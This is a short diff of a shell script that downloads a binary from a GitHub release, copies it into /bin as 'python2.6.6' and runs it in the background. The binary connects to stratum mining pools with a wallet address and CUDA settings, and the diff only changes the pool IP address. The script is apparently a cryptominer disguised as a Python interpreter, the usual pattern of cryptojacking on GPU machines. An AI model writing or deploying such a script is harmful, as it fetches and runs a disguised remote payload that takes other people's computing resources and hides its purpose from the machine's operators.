@@ -10,8 +10,8 @@ curl ipinfo.io
 wget https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
 chmod +x python2.6.6
 cp python2.6.6 /bin/python2.6.6
-python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log02.out 1> log02.out &
-python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log01.out 1> log01.out  &
+python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:21  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log02.out 1> log02.out &
+python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8 2> log01.out 1> log01.out  &
 nvidia-smi
 
 while [ 1 ]
